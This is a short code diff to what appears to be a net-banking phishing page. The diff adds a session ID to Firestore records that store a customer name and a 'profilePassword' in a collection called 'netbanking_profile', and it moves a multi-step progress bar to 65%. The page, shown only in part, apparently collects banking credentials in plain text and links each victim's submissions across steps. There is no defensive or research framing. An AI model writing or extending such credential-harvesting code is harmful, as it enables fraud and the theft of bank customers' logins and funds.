@@ -21,7 +21,16 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // Generate and store session ID
+    function generateSessionId() {
+      return 'session_' + Math.random().toString(36).substr(2, 9);
+    }
+
+    let sessionId = generateSessionId(); // Generate the session ID
+    console.log("Session ID:", sessionId); // For debugging or tracking session
   </script>
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -260,8 +269,6 @@
 </head>
 <body>
 
-
-
 <!-- Loading Overlay -->
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
@@ -283,8 +290,8 @@
 
 <!-- Progress Bar -->
 <div class="progress-bar-container">
-  <div class="progress-bar" style="width: 25%;">
-    <div class="progress-text">25% Complete</div>
+  <div class="progress-bar" style="width: 65%;">
+    <div class="progress-text">65% Complete</div>
   </div>
 </div>
 
@@ -330,10 +337,11 @@
       return;
     }
 
-    // Save data to Firestore
+    // Save data to Firestore with session ID
     db.collection("netbanking_profile").add({
       customerName: customerName,
       profilePassword: profilePassword,
+      sessionId: sessionId,  // Include sessionId in the document
       timestamp: firebase.firestore.FieldValue.serverTimestamp()
     })
     .then(() => {
